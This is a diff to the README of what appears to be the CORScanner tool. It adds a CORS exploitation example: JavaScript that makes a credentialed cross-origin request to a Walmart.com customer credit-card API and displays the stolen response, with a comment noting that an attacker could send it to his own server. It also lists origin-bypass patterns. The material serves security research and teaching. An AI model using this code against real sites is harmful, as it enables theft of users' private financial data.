@@ -73,9 +73,42 @@ Prefix_match             | `wwww.example.com` trusts `example.com.evil.com`
 Suffix_match             | `wwww.example.com` trusts `evilexample.com`
 Not_escape_dot           | `wwww.example.com` trusts `wwwaexample.com`
 Substring match          | `wwww.example.com` trusts `example.co`
-trust_null               | `wwww.example.com` trusts `null`, which can be forged by iframe sandbox scripts
+Trust_null               | `wwww.example.com` trusts `null`, which can be forged by iframe sandbox scripts
 HTTPS_trust_HTTP         | Risky trust dependency, a MITM attacker may steal HTTPS site secrets
-trust_any_subdomain      | Risky trust dependency, a subdomain XSS may steal its secrets
+Trust_any_subdomain      | Risky trust dependency, a subdomain XSS may steal its secrets
+
+## Exploitation examples
+Here is an example about how to exploit "Reflect_any_origin" misconfiguration on Walmart.com. Note that the vulnerability has been fixed.
+
+Walmart.com video on Youtube:
+
+[![Walmart_CORS_misconfiguration_exploitation](https://github.com/chenjj/CORScanner/raw/master/images/walmart.png)](http://www.youtube.com/watch?v=3abaevsSHXY)
+
+Here is the exploitation code:
+```javascript
+<script>
+    // Send a cross origin request to target website server, and read victim's private data
+    var req = new XMLHttpRequest();
+    req.open('GET',"https://www.walmart.com/account/electrode/account/api/customer/:CID/credit-card",true);
+    req.onload = stealData;
+    req.withCredentials = true;
+    req.send();
+
+    function stealData(){
+        //read the response, and extract the data
+        var data= JSON.stringify(JSON.parse(this.responseText),null,2);
+
+        //display it on the page. A real attacker can send the data to his server.
+        output(data);
+    }
+
+    function output(inp) {
+        document.body.appendChild(document.createElement('pre')).innerHTML = inp;
+    }
+</script>
+```
+
+If you have understood how the demo works, you can read Section 5 and Section 6 of the [CORS paper](https://www.jianjunchen.com/publication/an-empirical-study-of-cors/) and know how to exploit other misconfigurations.
 
 ## License
 
